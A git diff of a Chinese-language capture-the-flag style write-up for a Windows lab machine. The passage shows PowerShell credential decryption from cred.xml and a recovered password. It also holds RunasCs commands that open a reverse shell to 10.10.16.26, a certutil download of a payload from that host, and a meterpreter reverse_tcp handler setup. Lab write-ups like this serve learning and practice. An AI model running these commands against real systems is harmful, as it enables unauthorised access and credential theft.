@@ -818,9 +818,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 - nmap 80服务扫描
-```text
 
-```
 
 只开了一个80端口
 
@@ -891,10 +889,16 @@ $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList
 echo $Credential.GetNetworkCredential().password
 ```
 
+---
+hacktrick真好用
+```powershell
+$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *
+```
 
 
 使用powershell解密得到密码`f8gQ8fynP44ek1m3`
-使用runascs可以绕过uac
+使用[runascs](https://github.com/antonioCoco/RunasCs)可以绕过uac
+runas的进阶,可以通过显示凭据登录
 
 `.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.26:3333`
 
@@ -913,7 +917,7 @@ certutil -urlcache -f http://10.10.16.26:8000/pov.exe pov.exe
 开一个msfconsole,在multi/handler模块,使用`set payload window/x64/meterpreter/reverse_tcp`模块
 
 `.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "C:\\Users\\alaading\\pov.exe"`
-卡在sending stage了....
+卡在sending stage了....,应该是因为vpn在window上
 
 ### Manager
 #### user
